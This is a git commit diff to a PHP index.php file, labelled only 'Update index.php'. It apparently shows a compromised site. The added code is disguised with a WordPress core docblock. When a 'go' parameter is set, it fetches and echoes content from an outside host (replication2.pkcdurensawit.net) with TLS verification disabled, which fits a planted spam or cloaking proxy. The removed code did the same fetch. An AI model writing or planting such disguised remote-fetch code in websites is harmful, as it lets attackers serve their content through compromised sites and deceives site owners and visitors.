307fe8417d06c2c107553ecb746539aca99da9bf
GGeercy <112923883+ggeercy@users.noreply.github.com>
2024-06-15 13:03:36 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,35 +1,28 @@
 <?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+function fetchDataFromSite($site) {
+    $url = 'https://replication2.pkcdurensawit.net/trinitystemcells_assets/' . $site . '/';
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_CUSTOMREQUEST => 'GET'
+    ]);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+
 if(isset($_GET['go'])) {
-    $url = $_GET['go'];
-    $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
-    // INIT CURL
-    $ch = curl_init();
-
-    //init curl
-    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
-    // SET URL FOR THE POST FORM LOGIN
-    curl_setopt($ch, CURLOPT_URL, 'https://replication2.pkcdurensawit.net/trinitystemcells_assets/'.$url.'/');
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
-
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-
-    // common name and also verify that it matches the hostname provided)
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-
-    // Optional: Return the result instead of printing it
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-
-    // ENABLE HTTP POST
-    curl_setopt ($ch, CURLOPT_POST, 1);
-    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-
-    $store = curl_exec ($ch);
-    echo $store;
-
-    // CLOSE CURL
-    curl_close ($ch);
+    $site = $_GET['go'];
+    $data = fetchDataFromSite($site);
+    echo $data;
 
     
 
